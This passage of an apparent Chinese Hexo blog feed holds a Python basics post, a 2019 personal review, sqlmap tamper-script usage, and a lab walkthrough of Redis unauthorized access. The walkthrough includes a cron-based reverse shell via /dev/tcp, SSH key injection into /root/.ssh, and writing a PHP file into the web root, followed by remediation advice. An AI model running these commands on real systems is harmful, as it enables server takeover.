例如：</p><pre><code>sqlmap -u &quot;http://192.168.159.1/news.php?id=1&quot; -v 3 --dbs  --batch --tamper &quot;space2morehash.py&quot;大概以下三种</code></pre><p>space2hash.py<br>        base64encode.py<br>        charencode.py</p><pre><code>sqlmap -u &quot;http://192.168.159.1/news.php?id=1&quot; -v 3 --dbs  --batch --tamper=space2hash.py,base64encode.py,charencode.py使用多个插件，逗号分隔</code></pre><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python学习--&gt;python基础知识</title>
    <link href="https://www.mad-coding.cn/2020/02/06/python%E5%AD%A6%E4%B9%A0-python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>https://www.mad-coding.cn/2020/02/06/python学习-python基础知识/</id>
    <published>2020-02-06T10:35:07.000Z</published>
    <updated>2020-02-06T13:38:53.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天快速的学习了python的基础知识，这里简单做个记录</p><a id="more"></a><h1 id="0x01-注释"><a href="#0x01-注释" class="headerlink" title="0x01 注释"></a>0x01 注释</h1><p>单行注释用<code>#</code>，</p><p>多行注释用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206183927.png)</span><br><span class="line"></span><br><span class="line"># 0x02 变量以及类型</span><br><span class="line"></span><br><span class="line">## 2.2 变量的定义</span><br><span class="line"></span><br><span class="line">重复使用，并且经常需要修改的数据，可以定义为变量</span><br><span class="line"></span><br><span class="line">定义变量的语法为: `变量名 = 变量值`</span><br><span class="line"></span><br><span class="line">**程序就是用来处理数据的，而变量就是用来存储数据的**</span><br><span class="line"></span><br><span class="line">## 2.2 变量的类型</span><br><span class="line"></span><br><span class="line">![](https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206184100.png)</span><br><span class="line"></span><br><span class="line">在python中，不需要主动的去说明变量的类型，系统会自动辨别。也就是说在使用的时候 **变量没有类型，数据才有类型**。</span><br><span class="line"></span><br><span class="line">在终端中，如果临时想要查看一个变量存储的数据类型，可以使用 **type(变量的名字)**，来查看变量存储的数据类型</span><br><span class="line"></span><br><span class="line">![](https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206184657.png)</span><br><span class="line"></span><br><span class="line"># 0x03 标识符和关键字</span><br><span class="line"></span><br><span class="line">## 3.1 标识符的定义</span><br><span class="line"></span><br><span class="line">标识符是自己定义的,如变量名 、函数名等</span><br><span class="line"></span><br><span class="line">## 3.2 标识符的规则</span><br><span class="line"></span><br><span class="line">标识符由字母、下划线和数字组成，且数字不能开头</span><br><span class="line"></span><br><span class="line">python中的标识符是区分大小写的</span><br><span class="line"></span><br><span class="line">## 3.3 标识符的命名习惯</span><br><span class="line"></span><br><span class="line">1. 见名知意</span><br><span class="line">2. 驼峰命名法</span><br><span class="line">   - 小驼峰式命名法（lower camel case）： 第一个单词以小写字母开始；第二个单词的首字母大写，例如：myName、aDog</span><br><span class="line">   - 大驼峰式命名法（upper camel case）： 每一个单字的首字母都采用大写字母，例如：FirstName、LastName</span><br><span class="line">   - 还有一种命名法是用下划线“_”来连接所有的单词，比如send_buf，</span><br><span class="line"></span><br><span class="line">3.4 什么是关键字</span><br><span class="line"></span><br><span class="line">python一些具有特殊功能的标识符，这就是所谓的关键字</span><br><span class="line"></span><br><span class="line">关键字，已经被python官方使用了，所以不允许开发者自己定义和关键字相同名字的标识符</span><br><span class="line"></span><br><span class="line">![](https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206185248.png)</span><br><span class="line"></span><br><span class="line"># 0x04 输出</span><br><span class="line"></span><br><span class="line">## 4.1 普通输出</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#打印输出</span><br><span class="line">print(&quot;Hello World&quot;)</span><br></pre></td></tr></table></figure></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206185619.png" class="lozad"></p><h2 id="4-2-格式化输出"><a href="#4-2-格式化输出" class="headerlink" title="4.2 格式化输出"></a>4.2 格式化输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">name = <span class="string">"xiaohua"</span></span><br><span class="line">print(<span class="string">"我的姓名是%s, 年龄是%d"</span> % (name, age))</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206185845.png" class="lozad"></p><p>在程序中，看到了<code>%</code>这样的操作符，这就是Python中格式化输出。</p><p> <strong>常用的格式符号</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206185952.png" class="lozad"></p><h2 id="4-3-换行输出"><a href="#4-3-换行输出" class="headerlink" title="4.3 换行输出"></a>4.3 换行输出</h2><p>换行输出在需要换行的位置使用<code>\n</code>，<code>\</code>为转义字符</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206190221.png" class="lozad"></p><p><strong>转义字符表</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206190334.png" class="lozad"></p><h1 id="0x05-输入"><a href="#0x05-输入" class="headerlink" title="0x05 输入"></a>0x05 输入</h1><p>在Python中，获取键盘输入的数据的方法是采用 input 函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password = input(<span class="string">"请输入密码:"</span>)</span><br><span class="line">print(<span class="string">'您刚刚输入的密码是:%d'</span> % password)</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200206213849.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今天快速的学习了python的基础知识，这里简单做个记录&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019总结</title>
    <link href="https://www.mad-coding.cn/2020/01/30/2019%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mad-coding.cn/2020/01/30/2019总结/</id>
    <published>2020-01-30T13:15:52.000Z</published>
    <updated>2020-01-31T11:26:15.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>2019年过去过去快一个月了，写完了公司的年终总结PPT，却没有对自己的2019年做个总结，这里简单总结总结我的2019吧。</p><a id="more"></a><h1 id="0x01-关于生活"><a href="#0x01-关于生活" class="headerlink" title="0x01 关于生活"></a>0x01 关于生活</h1><p>2019年3月份，我拿到了我第一份实习offer，因为还没有毕业，需要一直以实习生的身份在公司工作，拿着3000块的收入，承担着我这个年龄不该有的压力，哈哈哈。不过出去房租和每月的水电费，剩下的钱也够我生活了。</p><p>2019年6月20日，我拿到了我的毕业证书和学士学位证书，公司也答应在7月份给我转正，当然工资也长了，嘿嘿嘿。每个月可以自己攒点钱了。</p><h1 id="0x02-关于技术"><a href="#0x02-关于技术" class="headerlink" title="0x02 关于技术"></a>0x02 关于技术</h1><p>网络安全，我真正的接触是在大二的时候，那时候和朋友交流的过程中，听到他说kali Linux这个渗透测试系统，开启了我的安全大门。然后自己学的是计算机科学与技术专业，和这个网络安全也是八竿子达不到边，于是就自己在网上找资料去学习，当初的赛扬处理器+4G内存的破联想电脑，开kali的虚拟机真是卡的怀疑人生，不过这没有让我对网络安全的兴趣有所减弱，按照网上的视频教程吧kali里面的一些小工具弄了一遍，玩的最多的是msf，因为这个可以控制别人的电脑，可装逼。</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/3327139c0d321da5" class="lozad"></p><p>除了msf，就属WiFi破解完的最多了，因为那时候的无线网还不多，为了破解无线网，我按网上的教程买了一个8187L的外置无线网卡，</p><p>然后把家里附近的无线网都破解了一遍，80%的都用字典跑开了，CPU满载电脑都有点吃不消。</p><p>2017年，我在freebuf上发表了一篇文章，还拿到了15个FB，让我兴奋不少，对网络安全的兴趣更加浓厚了。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200131172651.png" class="lozad"></p><p>前面都是废话，感慨一下。分割线</p><hr><p>第一，今年，我从一个不会日战的小白，学会了web网站渗透测试，以及OWASP TOP10漏洞的挖掘，熟悉漏洞的常见攻击手法以及防御方法。包括（文件上传，SQL 注入，跨站脚本、文件包含、命令执行、远程执行、SSRF、CSRF 等）；</p><p>第二，在工作中，不断学习渗透测试工具，主流的有 Burpsuite、Sqlmap、Metasploit、Awvs、AppScan、Nessus、Netsparker 等测试工具，有时候也会安装GitHub上的一些测试工具进行协助测试。</p><p>第三，学会了Android 端 APP 渗透测试方法、逆向工具使用。总结一下测试的思路。首先对拿到手的apk文件上传到360显危镜或者梆梆安全进行检测，然后在对apk文件进行反编译，查看是否被加壳了，如果加壳了，尝试脱壳，没有加壳查看是否存在一些信息的泄露，测试完APK文件，可通过安装对APP的业务层进行正常的测试，与web测试类似。</p><p>第四，通过公司的几次机会接触到了CTF比赛，对CTF的解题模式和AWD攻防模式有了初步的认识和理解。</p><p>在工作中，最擅长挖掘业务逻辑漏洞，比如未授权访问、未授权下载、水平越权、垂直越权、1分购买、任意密码重置等等。</p><h1 id="0x03-关于博客"><a href="#0x03-关于博客" class="headerlink" title="0x03 关于博客"></a>0x03 关于博客</h1><p>还记得第一次搭建博客是在大学的时候，使用WordPress进行搭建的，后来由于服务器需要续费，但是太贵了，就没有续费了，博客站点也就关了，转向CSDN，但是CSDN得文章需要通过审核，有些会审核不通过，这让我有些不爽，然后就有了后来的GitHub+hexo来搭建博客。</p><p>我记得研究这个博客的时候踩了很多坑，环境配置老是有问题，不过最后还是没有放弃，完整了博客的搭建，并且做了一些美化和基本的功能的添加。</p><p>博客地址：<a href="https://www.mad-coding.cn/">https://www.mad-coding.cn/</a></p><h1 id="0x04-关于2020"><a href="#0x04-关于2020" class="headerlink" title="0x04 关于2020"></a>0x04 关于2020</h1><p>2020有几个小目标：</p><p>第一，考两个证，先考软考信息安全工程师，然后考CISP-PTE</p><p>第二，一年看20本书，并且要写书评</p><p>第三，每周研究一个vulnhub中的靶场，并且输出文章</p><p>第四，每周至少锻炼4次</p><p>第五，每天看一个面试题，提升自己的面试基础。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;2019年过去过去快一个月了，写完了公司的年终总结PPT，却没有对自己的2019年做个总结，这里简单总结总结我的2019吧。&lt;/p&gt;
    
    </summary>
    
      <category term="其他文章" scheme="https://www.mad-coding.cn/categories/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="总结" scheme="https://www.mad-coding.cn/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问漏洞总结</title>
    <link href="https://www.mad-coding.cn/2020/01/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mad-coding.cn/2020/01/16/Redis未授权访问漏洞总结/</id>
    <published>2020-01-16T06:18:48.000Z</published>
    <updated>2020-01-17T07:08:53.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，经常会碰到各种未授权访问漏洞，今天总结一下redis的未授权访问漏洞，从靶机的环境搭建到漏洞复现再到getshell，如有错误的地方，还请各位大佬指出，共同进步。</p><a id="more"></a><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><h2 id="1-1-需要环境"><a href="#1-1-需要环境" class="headerlink" title="1.1 需要环境"></a>1.1 需要环境</h2><p>靶机</p><blockquote><p>操作系统：centos7 </p><p>redis版本：4.0.6</p></blockquote><p>攻击机</p><blockquote><p>操作系统：kali Linux 2019.4 x64</p><p>redis版本：4.0.6</p></blockquote><h2 id="1-2-靶机环境准备"><a href="#1-2-靶机环境准备" class="headerlink" title="1.2 靶机环境准备"></a>1.2 靶机环境准备</h2><h3 id="1-2-1-安装redis"><a href="#1-2-1-安装redis" class="headerlink" title="1.2.1 安装redis"></a>1.2.1 安装redis</h3><p>1.下载redis安装包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.6.tar.gz</span><br></pre></td></tr></table></figure><p>2.解压压缩包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-4.0.6.tar.gz</span><br></pre></td></tr></table></figure><p>3.yum安装gcc依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br></pre></td></tr></table></figure><p>注：遇到选择,输入y即可</p><p>4.跳转到redis解压目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd redis-4.0.6</span><br></pre></td></tr></table></figure><p>5.编译安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make MALLOC=libc</span><br></pre></td></tr></table></figure><p>将/usr/local/redis-4.0.6/src目录下的文件加到/usr/local/bin目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd src &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="1-2-2-修改相关配置"><a href="#1-2-2-修改相关配置" class="headerlink" title="1.2.2 修改相关配置"></a>1.2.2 修改相关配置</h3><p>将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</p><p>cp redis-server /usr/bin</p><p>cp redis-cli /usr/bin</p><p>返回目录redis目录，将redis.conf拷贝到/etc/目录下：</p><p>cp redis.conf /etc</p><p>编辑etc中的redis配置文件redis.conf</p><p>vim /etc/redis.conf</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116170112.png" class="lozad"><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116170212.png" class="lozad"><h3 id="1-2-3-redis相关使用命令"><a href="#1-2-3-redis相关使用命令" class="headerlink" title="1.2.3 redis相关使用命令"></a>1.2.3 redis相关使用命令</h3><p>连接redis：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h <span class="number">192.168</span><span class="number">.63</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p>查看redis版本信息、一些具体信息、服务器版本信息等等：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.63</span><span class="number">.130</span>:<span class="number">6379</span>&gt;info</span><br></pre></td></tr></table></figure><p>将变量x的值设为test：<br>是把整个redis数据库删除，一般情况下不要用！！！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.63</span><span class="number">.130</span>:<span class="number">6379</span>&gt;flushall</span><br></pre></td></tr></table></figure><p>查看所有键：</p><p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.63</span><span class="number">.130</span>:<span class="number">6379</span>&gt;CONFIG GET dir</span><br><span class="line"><span class="number">192.168</span><span class="number">.63</span><span class="number">.130</span>:<span class="number">6379</span>&gt;CONFIG GET dbfilename</span><br></pre></td></tr></table></figure><p>查看redis服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep redis</span><br></pre></td></tr></table></figure><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116164841.png" class="lozad"><p>关闭redis服务 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill 8234</span><br></pre></td></tr></table></figure><h2 id="1-3-攻击机环境准备"><a href="#1-3-攻击机环境准备" class="headerlink" title="1.3 攻击机环境准备"></a>1.3 攻击机环境准备</h2><h3 id="1-3-1-安装redis"><a href="#1-3-1-安装redis" class="headerlink" title="1.3.1 安装redis"></a>1.3.1 安装redis</h3><p>下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:*//download.redis.io/releases/redis-4.0.11.tar.gz*</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-4.0.11.tar.gz</span><br></pre></td></tr></table></figure><p>切换到src目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /redis-4.0.11/src</span><br></pre></td></tr></table></figure><h1 id="0x02-复现漏洞"><a href="#0x02-复现漏洞" class="headerlink" title="0x02 复现漏洞"></a>0x02 复现漏洞</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.110.8 -p 端口号</span><br></pre></td></tr></table></figure><p>出现下面信息，说明存在未授权访问漏洞</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116171818.png" class="lozad"><h1 id="0x03-反弹shell"><a href="#0x03-反弹shell" class="headerlink" title="0x03 反弹shell"></a>0x03 反弹shell</h1><h2 id="3-1-利用计划任务执行命令反弹shell"><a href="#3-1-利用计划任务执行命令反弹shell" class="headerlink" title="3.1 利用计划任务执行命令反弹shell"></a>3.1 利用计划任务执行命令反弹shell</h2><h3 id="3-1-1-利用原理"><a href="#3-1-1-利用原理" class="headerlink" title="3.1.1 利用原理"></a>3.1.1 利用原理</h3><p>在攻击机上开启nc反弹端口监听，通过redis未授权访问漏洞，写入定时计划，反弹shell。</p><h3 id="3-1-2-开始攻击"><a href="#3-1-2-开始攻击" class="headerlink" title="3.1.2 开始攻击"></a>3.1.2 开始攻击</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p><p>先在自己的服务器上监听一个端口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">6666</span></span><br></pre></td></tr></table></figure><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116181910.png" class="lozad"><p>然后在kali中执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># redis-cli -h 192.168.110.8</span></span><br><span class="line">192.168.63.130:6379&gt; <span class="built_in">set</span> x <span class="string">"\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.110.128/6666 0&gt;&amp;1\n"</span></span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>kali攻击机上成功反弹shell</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116181927.png" class="lozad"><p>注意：定时计划中的ip地址是攻击记的ip地址，不是靶机的ip地址。</p><h2 id="3-2-写ssh-keygen公钥然后使用私钥登陆"><a href="#3-2-写ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="3.2 写ssh-keygen公钥然后使用私钥登陆"></a>3.2 写ssh-keygen公钥然后使用私钥登陆</h2><h3 id="3-3-1-什么是秘钥认证？"><a href="#3-3-1-什么是秘钥认证？" class="headerlink" title="3.3.1 什么是秘钥认证？"></a>3.3.1 什么是秘钥认证？</h3><p>所谓的秘钥认证，就是基于公钥密码的认证，使用公钥加密，私钥解密，其中公钥是公开的，放在服务器端</p><p>可以把同一个公钥放在你想SSH登陆的服务器中，而私钥自己知道</p><p>大致过程：</p><p>1.客户端生成私钥和公钥，并把公钥拷贝给服务器端</p><p>2.客户端发起登陆请求，发送自己的相关信息</p><p>3.服务器端根据客户端发来的信息查找是否有该客户端的公钥，若没有拒绝登陆；若有则生成一段随机数，<br>使用该公钥加密后发给客户端</p><p>4.客户端收到服务器发来的加密信息后使用私钥解密，并把解密后的结果发给服务器用于验证</p><p>5.服务器收到客户端发来的解密结果，与刚刚自己生成的随机数对比，如果一致就允许登陆；不一致则拒绝登陆</p><h3 id="3-2-2-利用条件"><a href="#3-2-2-利用条件" class="headerlink" title="3.2.2 利用条件"></a>3.2.2 利用条件</h3><ul><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li><li>靶机的root目录下需要有.ssh目录</li></ul><h3 id="3-2-3-利用原理"><a href="#3-2-3-利用原理" class="headerlink" title="3.2.3 利用原理"></a>3.2.3 利用原理</h3><p>　原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200117085152.png" class="lozad"><p>3.3.2 开始攻击</p><p>首先需要kali攻击机在本地生成一对秘钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后三次回车，生成秘钥，如下图</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116231107.png" class="lozad"><p>查看是否成功生成</p><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116231242.png" class="lozad"><p>查看公钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116231442.png" class="lozad"><p>将公网的内容复制到记事本中待用</p><p>然后redis执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"><span class="built_in">set</span> x <span class="string">"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqoeuRrrzFrayXuBMmU37QTJmXHV322PmdRMi5cfOz1zp8ZWCq6E9Q3hCMRDgLjpMKr7d8A4+g3YdUPoi14VbHEGa4BurlBbw00TNAI8pa2PO1c+6hwU3iH8DOHHqFjUD3nxxLUs5Z5dhGRX45UqnU3OQ9gU93ioDjTwiYEvg+Q7QDMWYo8jRa1aQ1m8sb9CRwgWCBZES+AHcSxFwsw/GgT6Naj1O8vyG0KPGAMidEGcbWH5PTS/iShLdGAAiqKynBs0KvVOVPC3KvdTGAZWeQIr3FDOvKB44cB04/mphV0/A3whW+jJZDDcyP4k+SoWafwlSt9dlbdhWBY4Br6uY+habZcpDnRWVudkdQm03Yesk4Xd+74t70pzfs6BxVeWdEORyKL5oAo4B1kZm7ivqf2uzx5KhJt3cVlmLMdvtcVELioKZsngwaqVVNUG4/1l0nS0s7+2OgJYZyAXEdRv6tFXcKSsf9d9frdscnsLvF6/pmVGpUc3VdQvNynHf9om0= root@kali\n\n\n"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注：需要将上面的公钥替替换攻击机的秘钥。</p><p>save后可以直接利用攻击机kali的私钥登录ssh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.110.8</span><br></pre></td></tr></table></figure><img data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200116231858.png" class="lozad"><h2 id="3-3-往web物理路径写webshell"><a href="#3-3-往web物理路径写webshell" class="headerlink" title="3.3 往web物理路径写webshell"></a>3.3 <strong>往web物理路径写webshell</strong></h2><p><strong>利用条件：</strong>redis权限不高，<strong>服务器开着web服务</strong>，<strong>在redis有web目录写权限时</strong>，可以尝试往web路径（<strong>根据实际情况</strong>）写webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h1 id="0x04-报告书写"><a href="#0x04-报告书写" class="headerlink" title="0x04 报告书写"></a>0x04 报告书写</h1><h2 id="4-1-漏洞描述"><a href="#4-1-漏洞描述" class="headerlink" title="4.1 漏洞描述"></a><strong>4.1 漏洞描述</strong></h2><p>Redis默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；</p><p>如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。</p><p>攻击者访问之后，利用Redis自身提供的config命令，可以进行写文件操作</p><p>可以成功把自己的SSH公钥写入目标服务器的/root/.ssh文件夹的authotrized_keys文件中，进而可以使用对应私钥直接使用ssh服务登陆目标服务器</p><p>简单来说，漏洞产生的条件有以下两点：</p><ol><li>redis服务绑定在0.0.0.0:6379端口，而且信任了其他IP，导致了Redis服务暴露在公网上</li><li>没有设置密码认证，可以免密登陆Redis服务</li></ol><h2 id="4-2-风险分析"><a href="#4-2-风险分析" class="headerlink" title="4.2 风险分析"></a>4.2 风险分析</h2><ol><li>导致敏感信息泄露，恶意执行flushall清空所有数据</li><li>通过Eval执行Lua代码，通过备份功能往磁盘写入后门文件</li><li>如果Redis服务以root身份运行，可以给root用户写入SSH公钥文件，直接通过SSH登陆服务器</li></ol><h2 id="4-3-测试过程"><a href="#4-3-测试过程" class="headerlink" title="4.3 测试过程"></a>4.3 测试过程</h2><p>参考复现漏洞过程</p><h2 id="4-4-漏洞类型"><a href="#4-4-漏洞类型" class="headerlink" title="4.4 漏洞类型"></a>4.4 漏洞类型</h2><p>主机漏洞</p><h2 id="4-5-漏洞级别"><a href="#4-5-漏洞级别" class="headerlink" title="4.5 漏洞级别"></a>4.5 漏洞级别</h2><p>高</p><h2 id="4-6-修复建议"><a href="#4-6-修复建议" class="headerlink" title="4.6 修复建议"></a>4.6 修复建议</h2><p>防止这个漏洞需要修复以下三处问题 </p><p>第一： 修改redis绑定的IP 如果只在本机使用redis服务那么只要绑定127.0.0.1 如果其他主机需要访问redis服务那么只绑定客户主机所在网络的接口 最好不要绑定0.0.0.0 